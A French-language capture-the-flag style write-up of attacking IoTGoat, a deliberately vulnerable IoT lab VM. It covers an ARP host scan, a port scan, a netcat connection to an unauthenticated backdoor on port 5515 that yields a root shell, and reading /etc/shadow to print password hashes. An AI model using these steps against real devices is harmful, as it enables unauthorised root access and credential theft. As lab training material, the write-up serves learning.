# IoTGoat

🖥️ **rNET**

Découverte d’hotes

```
┌──[m0rph3u5@parrot]─[~/Scripts]
└──╼ $sudo ./rNET.sh
                                               
░       ░░░   ░░░  ░░        ░░        ░
▒  ▒▒▒▒  ▒▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒
▓       ▓▓▓  ▓  ▓  ▓▓      ▓▓▓▓▓▓▓  ▓▓▓▓
█  ███  ███  ██    ██  ███████████  ████
█  ████  ██  ███   ██        █████  ████
                                                   
                                                
by M0rPH3U53

🔍 Scan ARP...100%
 
[+] Hotes 
 
┌────────────────┬───────────────────┬──────────────────────────────┐
│       📍       │         🕵️        │              🏭              │
├────────────────┼───────────────────┼──────────────────────────────┤
│ 192.168.56.1   │ 0a:00:27:00:00:00 │ Unknown vendor               │
│ 192.168.56.2   │ 08:00:27:06:49:51 │ PCS Systemtechnik GmbH       │
│ 192.168.56.254 │ 08:00:27:05:87:b3 │ PCS Systemtechnik GmbH       │
└────────────────┴───────────────────┴──────────────────────────────┘
 
[+] Total: 3 
```

&nbsp;

<span style="color: #dddddd;">👁️</span> **Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 22/tcp open
[+] 80/tcp open
[+] 53/tcp open
[+] 443/tcp open
[+] 5515/tcp open
[+] 5000/tcp open

📄 Rapport --> /home/m0rph3u5/Massap
```

&nbsp;

**📑 Rapport**

Un port identifier qui nous donne un shell (sans authentification)
<img width="765" height="62" alt="51d5857b8dcfef31cf598508d6d59875" src="https://github.com/user-attachments/assets/739bb567-9dfa-475b-ae92-a9331866ea8f" />

&nbsp;

**<span style="color: #dddddd;">🐾</span> nc**

Connexion au port `5515`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nc 192.168.56.254 5515
[***]Successfully Connected to IoTGoat's Backdoor[***]
ash -i

BusyBox v1.28.4 () built-in shell (ash)

/ # id
uid=0(root) gid=0(root)
```

&nbsp;

🔒**Shadow**

Hash des users

```
/ # cat /etc/shadow | grep '$1'
root:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:18145:0:99999:7:::
iotgoatuser:$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:18145:0:99999:7:::
```
